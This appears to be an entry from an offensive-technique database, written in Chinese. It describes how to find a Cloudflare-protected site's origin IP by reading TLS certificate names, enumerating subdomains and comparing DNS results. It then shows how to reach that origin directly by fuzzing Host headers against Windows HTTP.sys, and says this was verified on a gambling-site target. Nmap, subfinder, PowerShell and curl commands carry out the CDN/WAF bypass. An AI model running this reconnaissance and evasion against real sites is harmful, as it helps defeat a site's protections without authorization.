# 从 TLS 证书 CN 反查不走 CDN 的子域 ⇒ 源站 IP 泄露 + 绕过 Cloudflare（含 HTTP.sys Host 头路由命中技巧）

- **code**: 从-tls-证书-cn-反查不走-cdn-的子域-源站-ip-泄露-绕过-cloudflare-含-http.sys-host-头路由命中技巧
- **kind**: script
- **category**: info-leak
- **severity**: high
- **language**: bash
- **source**: self
- **verified**: 1
- **verified_note**: 在 tgt9942-com 靶标实测：`target62.example.com` 的 admin/netadmin/net/bwpc1 四子域全解析到 Cloudflare（203.0.113.70 / 203.0.113.21），而证书 CN `example.com` 直连 203.0.113.73；以 `Host: target65.example.com` 请求 http://203.0.113.73/ 得到 **200 / 15102 字节** 的完整 ASP.NET MVC 博彩平台首页（含 X-AspNetMvc-Version: 5.2 指纹），而未注册 Host 一律返回 HTTP.sys 裸 404（315 字节）。全过程直连源站，未经过 Cloudflare，零封禁。
- **path**: pocs/从-tls-证书-cn-反查不走-cdn-的子域-源站-ip-泄露-绕过-cloudflare-含-http.sys-host-头路由命中技巧/origin-ip-leak-via-cert-cn.md
- **tags**: recon,cloudflare,源站泄露,http.sys,host头路由,cert-cn
- **created_at**: 2026-09-28T22:41:39.408Z

## 描述

站群用 Cloudflare 隐藏源站时，从其子域 TLS 证书 CN 反查出“忘记套 CDN 的那个子域”，拿到源站真实 IP；对 Windows/HTTP.sys 源站必须再用枚举到的子域作 Host 头逐个 fuzz（HTTP.sys 按 Host 匹配 URL 前缀），即可直连真实业务系统并全程绕过 CDN WAF。

## 用法

```
1) nmap -Pn -sT -p 443,8443 --script ssl-cert <IP> 取证书 CN/SAN；2) subfinder -d <域名> -all -silent 枚举子域；3) 逐个 Resolve-DnsName 找出发往自有机房/非 CDN 段的那个子域 = 源站 IP；4) 用该子域反查 IP，再把全部子域当 Host 头逐个 curl 打源站 IP；5) 出现 200 的就是真实业务系统，之后所有请求固定 -H "Host: <命中子域>" 直连源站 IP。
```

## 正文

```
# 方法名：从 TLS 证书 CN 找“不走 CDN 的那个子域” ⇒ 源站 IP 泄露 + 绕过 WAF

## 适用场景
目标站群/业务使用了 Cloudflare（或任何 CDN/WAF）隐藏源站：主域名与多数子域解析到 CDN 段，
但**只要有一个子域直连真实 IP**，整个源站就泄露了。这类“漏网子域”最常见的成因是
**运维为了某个内部/接口/回调服务单独签发并直连了证书**，忘了套 CDN。

## 完整步骤

### 1) 从任意端口取 TLS 证书，拿到一个“非主域名”的 CN/SAN
```bash
nmap -Pn -sT -n -sV -p 443,8443 --script ssl-cert <IP>
# 输出示例：
#   Subject: commonName=example.com
#   Subject Alternative Name: DNS:example.com
```
关键：**证书 CN 常是内部服务的真实域名**（本例 `example.com`
= Telegram 通知 API 支持服务），这类服务往往不走 CDN。

### 2) 子域枚举，找出所有子域
```bash
subfinder -d target62.example.com -all -silent
subfinder -d target62.example.com -silent | dnsx -a -resp     # 有 dnsx 时
```

### 3) 逐个解析，比对解析结果 —— 找出不走 CDN 的那个
```powershell
Get-Content subs.txt | ForEach-Object { $d=$_; $r=(Resolve-DnsName -Name $d -Type A -EA SilentlyContinue).IPAddress; "$d -> $($r -join ',')" }
```
判据：**解析到 Cloudflare 段（172.67.x / 104.21.x / 104.16-31.x / 188.114.x）的是走 CDN 的；
解析到目标自有网段/其它 IP 的 = 源站**。本例结果：
```
target63.example.com      -> 203.0.113.70,203.0.113.21   ← Cloudflare
target64.example.com   -> 203.0.113.70,203.0.113.21   ← Cloudflare
target65.example.com        -> 203.0.113.70,203.0.113.21   ← Cloudflare
target66.example.com      -> 203.0.113.21,203.0.113.70   ← Cloudflare
example.com -> 203.0.113.73  ← ⭐ 直连，源站泄露
```

### 4) 用泄露的子域 IP 作为“源站 IP”，绕过 CDN/WAF 直连
```bash
curl.exe -s -k -o NUL -w "%{http_code}|%{size_download}" \
  -A "<Chrome UA>" -H "Host: target65.example.com" "http://203.0.113.73/"
# => 200|15102  ← 直连源站成功，绕过 Cloudflare
```

## ⭐ 关键技巧：HTTP.sys / IIS 的 Host 头路由（Windows 源站必用）
Windows 源站常见 **HTTP.sys 内核驱动**监听 80/443，它**按 Host 头做 URL 前缀匹配**：
- 用未知 Host 访问 → `Server: Microsoft-HTTPAPI/2.0` + 裸 404（315 字节，**这是 HTTP.sys 的默认响应，不是 IIS 的 404**）
- 用**正确的 Host** 访问 → 直接命中真实站点

因此**必须把枚举到的所有子域当作 Host 头逐个打源站 IP**（不要只试 IP 直连）：
```powershell
foreach($h in (Get-Content subs.txt)){ 
  curl.exe -s -o NUL -w "$h -> %{http_code}|%{size_download}`n" -A "<Chrome UA>" -H "Host: $h" "http://<源站IP>/"
}
```
本例命中：`Host: target65.example.com` → **200 / 15102 字节**（完整业务站首页），
而 `admin`/`netadmin`/`bwpc1`/`app`/`mail` 全部 404。**HTTP.sys 上只注册了 net 这一个前缀**。

## 判据与坑
- **判“HTTP.sys 裸 404”**：`Server: Microsoft-HTTPAPI/2.0` + `Content-Length: 315` + 正文
  `HTTP Error 404. The requested resource is not found.` ⇒ 说明服务在跑但**该 Host 没注册 URL 前缀**，
  不是目标不存在。**几乎所有 batch 探测都会被 404 误导，必须补 Host 头 fuzz**。
- **HTTP 探测一律带 Chrome UA**（部分站点按 UA 拦）。
- 443 若 TCP 可连但 TLS 一律 RST：多为前置防护/未注册的哑端口，不要当入口。
- 找到源站 IP 后，**后续所有测试都打源站 IP + Host 头**，即可全程绕过 CDN 的 WAF/速率限制
  （本例全程 0 封禁）。
```
